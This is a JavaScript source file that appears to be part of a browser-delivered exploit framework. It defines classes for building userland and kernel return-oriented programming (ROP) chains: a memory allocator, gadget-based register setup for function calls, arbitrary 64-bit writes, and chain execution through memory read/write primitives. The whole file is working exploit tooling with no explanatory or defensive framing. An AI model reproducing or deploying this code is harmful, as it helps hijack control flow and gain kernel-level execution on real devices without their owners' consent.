window.memory = function (address) {
  this.basePtr = address;
  this.dataPtr = 0;

  /* Return a pointer in mmap'd memory */
  this.allocate = function(size) {
    /* Prevent buffer overflow / pagefault */
    if (this.dataPtr > 0x10000 || this.dataPtr + size > 0x10000)
      return -1;

    var memAddr = this.basePtr.add32(this.dataPtr);

    this.dataPtr += size;

    return memAddr;
  };

  /* Clears all data by zeroing out this.data and resetting count */
  this.clear = function() {
    for (var i = 0; i < 0x10000; i += 8)
      p.write8(this.basePtr.add32(i), 0);
  };

  /* Zero out our data buffer before returning a storage object */
  this.clear();

  return this;
};

// Class for quickly creating a kernel ROP chain
window.kropchain = function (addr) {
  // Contains base and stack pointer for fake stack (this.stackBase = RBP, this.stackPointer = RSP)
  this.stackBase = addr;
  this.count = 0;

  // Push instruction / value onto fake stack
  this.push = function (val) {
    p.write8(this.stackBase.add32(this.count * 8), val);
    this.count++;
  };

  // Write to address with value (helper function)
  this.write64 = function (address, value) {
    this.push(gadgets["pop rdi"]);
    this.push(address);
    this.push(gadgets["pop rax"]);
    this.push(value);
    this.push(gadgets["mov [rdi], rax"]);
  };

  // Return kropchain object
  return this;
};

// Class for quickly creating and managing a ROP chain
window.rop = function() {
  this.stack = new Uint32Array(0x4000); // 0x4000
  this.stackBase = p.read8(p.leakval(this.stack).add32(window.leakval_slide));
  this.count = 0;

  this.clear = function() {
    this.count = 0;
    this.runtime = undefined;

    for (var i = 0; i < 0xFF0 / 2; i++)
		p.write8(this.stackBase.add32(i * 8), 0);
  };

  this.pushSymbolic = function() {
    this.count++;
    return this.count-1;
  };

  this.finalizeSymbolic = function(idx, val) {
    p.write8(this.stackBase.add32(idx * 8), val);
  };

  this.push = function(val) {
    this.finalizeSymbolic(this.pushSymbolic(), val);
  };

  this.push_write8 = function(where, what) {
      this.push(gadgets["pop rdi"]);
      this.push(where);
      this.push(gadgets["pop rsi"]);
      this.push(what);
      this.push(gadgets["mov [rdi], rsi"]);
  };

  this.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]);
      this.push(rdi);
    }

    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]);
      this.push(rsi);
    }

    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]);
      this.push(rdx);
    }

    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]);
      this.push(rcx);
    }

    if (r8 != undefined) {
      this.push(gadgets["pop r8"]);
      this.push(r8);
    }
    
    if (r9 != undefined) {
      this.push(gadgets["pop r9"]);
      this.push(r9);
    }

    this.push(rip);
    return this;
  };
  
  /* Sets up a return value location */
  this.saveReturnValue = function(where) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["mov [rdi], rax"]);
  };
  
  this.run = function() {
      var retv = p.loadchain(this, this.notimes);
      //var retv = p.loadchain(this);
      this.clear();
      return retv;
  };
  
  return this;
};